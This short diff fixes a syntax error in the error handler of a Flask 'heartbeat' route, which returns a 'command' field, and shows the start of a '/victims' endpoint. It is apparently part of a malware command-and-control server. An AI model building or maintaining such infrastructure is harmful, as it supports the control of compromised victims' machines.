@@ -77,7 +77,7 @@ def heartbeat():
         return jsonify({'status': 'ok', 'command': None})
 
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e'}), 500
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/victims', methods=['GET'])
 def get_victims():
